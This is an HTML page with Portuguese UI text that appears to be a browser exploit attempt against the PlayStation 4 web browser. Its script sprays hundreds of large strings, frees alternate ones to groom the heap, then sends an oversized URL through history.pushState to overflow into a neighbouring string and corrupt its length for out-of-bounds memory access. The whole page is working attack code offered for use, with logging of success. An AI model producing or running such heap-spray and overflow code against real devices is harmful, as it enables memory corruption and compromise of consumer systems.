<!DOCTYPE html>
<html>
<head>
    <title>PS4 String-to-String Attack 2</title>
    <style>
        body { background-color: #050505; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #0f0; background: #000; color: #fff; font-weight: bold;
        }
        #log { border: 1px solid #333; background: #111; padding: 10px; height: 300px; overflow-y: scroll; text-align: left; color: cyan; }
        .win { color: #fff; background-color: #008800; padding: 5px; font-size: 20px;}
    </style>
</head>
<body>

    <h1>Ataque String-contra-String</h1>
    <p>Tentando corromper o comprimento de uma String vizinha.</p>

    <button onclick="runStringExploit()">INICIAR ALINHAMENTO DE STRINGS</button>
    
    <div id="log">Pronto. Reinicie o console para garantir memória limpa.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso

        // Precisamos de strings que ocupem aproximadamente 1MB ou 2MB na memória
        // JS Strings usam 2 bytes por caractere (UTF-16) geralmente, ou 1 byte se for Latin-1.
        // Vamos assumir 1 byte por char para simplificar a conta do "Balde".
        const STRING_LEN = 512 * 1024; // 1 Milhão de caracteres (~1MB ou 2MB RAM)
        const SPRAY_COUNT = 500;

        var victims = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += "<div>" + msg + "</div>";
            el.scrollTop = el.scrollHeight;
        }

        function runStringExploit() {
            log("1. Gerando " + SPRAY_COUNT + " Strings Gigantes (Spray)...");

            setTimeout(() => {
                try {
                    // Cria uma string base gigante de "B"s
                    const baseStr = "B".repeat(STRING_LEN);

                    // Aloca muitas cópias
                    for (let i = 0; i < SPRAY_COUNT; i++) {
                        // Adicionamos o índice no começo para identificar qual foi atingida
                        // Ex: "IDX:001 BBBBB..."
                        let prefix = "IDX:" + i.toString().padStart(3, '0') + " ";
                        // Fatia para manter o tamanho exato
                        let finalStr = prefix + baseStr.slice(prefix.length);
                        victims.push(finalStr);
                    }

                    log("2. Abrindo buracos (Estratégia Queijo Suíço)...");
                    
                    // Apaga uma sim, uma não, para criar buracos onde o exploit vai cair
                    for (let i = 0; i < SPRAY_COUNT; i += 2) {
                        victims[i] = null; 
                    }

                    // Força GC
                    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}

                    log("3. Disparando Overflow no Buraco...");

                    setTimeout(() => {
                        // Payload
                        let buffer = "A".repeat(BASE_OFFSET);
                        // Overflow seguro
                        buffer += "\x01".repeat(OVERFLOW_AMT);

                        history.pushState({}, "str_pwn", "/" + buffer);

                        log("4. Verificando integridade das Strings...");
                        checkStrings();

                    }, 1000);

                } catch (e) {
                    log("Erro (OOM): " + e.message);
                }
            }, 200);
        }

        function checkStrings() {
            let found = false;
            
            // Verifica apenas as strings que sobraram (índices ímpares)
            for (let i = 1; i < victims.length; i += 2) {
                let v = victims[i];
                if (!v) continue;

                // CHECK 1: O Tamanho mudou?
                if (v.length !== STRING_LEN) {
                    log("<span class='win'>!!! SUCESSO (LENGTH) !!!</span>");
                    log("String #" + i + " mudou de tamanho!");
                    log("Original: " + STRING_LEN + " | Novo: " + v.length);
                    found = true;
                    // Se o tamanho ficou gigante, podemos ler a memória!
                    break;
                }

                // CHECK 2: O Conteúdo mudou?
                // Checa o primeiro caractere e o índice 1000
                // Deveria ser 'I' (de IDX) ou 'B'. Se for 0x01 (caractere estranho), BINGO.
                if (v.charCodeAt(0) === 1 || v.charCodeAt(1000) === 1) {
                    log("<span class='win'>!!! SUCESSO (CONTENT) !!!</span>");
                    log("String #" + i + " foi corrompida por 0x01!");
                    found = true;
                    break;
                }
            }

            if (!found) {
                log("Nenhuma string corrompida.");
                log("Dica: Tente mudar o STRING_LEN para 512*1024 ou 2*1024*1024.");
            }
        }
    </script>
</body>
</html>


